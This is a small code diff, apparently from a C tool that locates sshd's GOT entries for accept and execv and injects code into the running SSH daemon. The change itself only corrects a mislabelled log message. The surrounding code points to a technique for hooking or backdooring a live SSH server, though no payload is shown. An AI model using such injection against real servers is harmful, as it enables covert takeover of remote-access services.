@@ -94,7 +94,7 @@ main (int argc, char **argv)
   uint64_t accept_got = sshd_base + get_got_offset (sshd_path, "accept");
   printf ("[INFO]: accept_got at: 0x%lx\n", accept_got);
   uint64_t execv_got = sshd_base + get_got_offset (sshd_path, "execv");
-  printf ("[INFO]: accept_got at: 0x%lx\n", execv_got);
+  printf ("[INFO]: execv_got at: 0x%lx\n", execv_got);
 
   uint64_t code_start
       = inject_start (pid, sizeof (sshd_accept) + sizeof (sshd_execv));
